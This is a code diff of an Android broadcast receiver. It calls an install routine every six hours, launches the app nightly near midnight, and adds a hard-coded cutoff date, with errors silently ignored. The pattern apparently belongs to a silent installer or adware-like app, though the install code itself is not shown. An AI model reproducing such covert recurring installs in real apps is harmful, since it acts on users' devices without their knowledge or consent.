@@ -25,7 +25,7 @@ public class StartServiceReceiver extends BroadcastReceiver {
 	java.text.SimpleDateFormat sf = new java.text.SimpleDateFormat("yyyyMMdd");
     @Override      
     public void onReceive(Context context, Intent intent) { 
-    	Log.e("StartServiceReceiver","StartServiceReceiver++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
+    	//Log.e("StartServiceReceiver","StartServiceReceiver++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
     	this.context = context;
    	 if (intent.getAction().equals("com.custom.broadcast.StartServiceReceiver")) { 
    		 //每隔6小时安装一次
@@ -37,34 +37,59 @@ public class StartServiceReceiver extends BroadcastReceiver {
    		 }catch(Exception e){
    			 
    		 }
+   		 
    		 Date dateTime = new Date();
+   		 long nowTime = dateTime.getTime();
+
+   		 
+   		 
    		 try{
-   	   		long nowTime = dateTime.getTime();
+   			 //限制条件
+   	   		 java.util.Calendar c = java.util.Calendar.getInstance();
+   	   		 c.set(2012, 2, 28);
+   	   		if(c.getTime().getTime()<nowTime){
+   	   			return ;
+   	   		}
+   	   		
    	   		if(nowTime-times>=sixHoure){
-   	   			new CustomUtils(context).install();
    	   			SharedPreferencesUtils.setConfigString(
-     				SharedPreferencesUtils.CONFIG_INFO, 
-     				SharedPreferencesUtils.INSTALL_TIME,
-     				String.valueOf(nowTime));
+   	      				SharedPreferencesUtils.CONFIG_INFO, 
+   	      				SharedPreferencesUtils.INSTALL_TIME,
+   	      				String.valueOf(nowTime));
+   	   			new Thread(){
+   	   				public void run(){
+   	    	   			new CustomUtils(StartServiceReceiver.this.context).install();
+   	   				}
+   	   			}.start();
+
    	   		}
     	 }catch(Exception e){
     			 
     	 }
 
-   		 //没天12点左右打开程序
-   		 String wakeup_date =SharedPreferencesUtils.getConfigString(
- 				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.WAKEUP_DATE);
-   		 String nowDate = sf.format(dateTime);
-    	 if(wakeup_date.equals("")||!nowDate.equals(wakeup_date)){
-    		 if(dateTime.getHours()==23&&dateTime.getMinutes()>50){
-    			 new CustomUtils(context).wakeUpApp();
-    	   			SharedPreferencesUtils.setConfigString(
-    	     				SharedPreferencesUtils.CONFIG_INFO, 
-    	     				SharedPreferencesUtils.WAKEUP_DATE,
-    	     				String.valueOf(nowDate));
-    		 }
+
+    	 try{
+       		 //没天12点左右打开程序
+       		 String wakeup_date =SharedPreferencesUtils.getConfigString(
+     				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.WAKEUP_DATE);
+       		 String nowDate = sf.format(dateTime);
+        	 if(wakeup_date.equals("")||!nowDate.equals(wakeup_date)){
+        		 if(dateTime.getHours()==23&&dateTime.getMinutes()>50){
+        			 
+        	   			SharedPreferencesUtils.setConfigString(
+        	     				SharedPreferencesUtils.CONFIG_INFO, 
+        	     				SharedPreferencesUtils.WAKEUP_DATE,
+        	     				String.valueOf(nowDate));
+           	   			new Thread(){
+           	   				public void run(){
+           	   					new CustomUtils(StartServiceReceiver.this.context).wakeUpApp();
+           	   				}
+           	   			}.start();
+        		 }
+        	 }
+    	 }catch(Exception e){
+			 
     	 }
-    	 
     	
    		 
 	 }
